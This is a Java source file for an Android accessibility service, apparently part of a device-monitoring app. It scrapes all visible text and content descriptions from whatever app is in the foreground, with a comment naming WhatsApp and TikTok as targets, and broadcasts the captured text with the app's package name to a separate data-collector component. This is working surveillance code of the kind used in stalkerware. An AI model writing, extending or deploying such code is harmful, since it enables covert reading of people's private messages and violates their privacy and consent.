package com.devicemonitor;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class MonitorAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        // Extract text from visible nodes (captures WhatsApp/TikTok content)
        StringBuilder sb = new StringBuilder();
        extractText(root, sb, 0);

        if (sb.length() > 0) {
            // Send to DataCollector via broadcast
            Intent intent = new Intent("com.devicemonitor.TEXT_CAPTURED");
            intent.putExtra("source", event.getPackageName() != null ? event.getPackageName().toString() : "unknown");
            intent.putExtra("text", sb.toString().trim());
            sendBroadcast(intent);
        }

        root.recycle();
    }

    private void extractText(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null) return;
        if (depth > 5) return; // limit recursion

        if (node.getText() != null) {
            String t = node.getText().toString().trim();
            if (!t.isEmpty()) {
                sb.append(t).append("\n");
            }
        }

        if (node.getContentDescription() != null) {
            String cd = node.getContentDescription().toString().trim();
            if (!cd.isEmpty()) {
                sb.append("[desc: ").append(cd).append("]\n");
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            extractText(node.getChild(i), sb, depth + 1);
        }
    }

    @Override
    public void onInterrupt() {
        // Service interrupted
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
    }
}
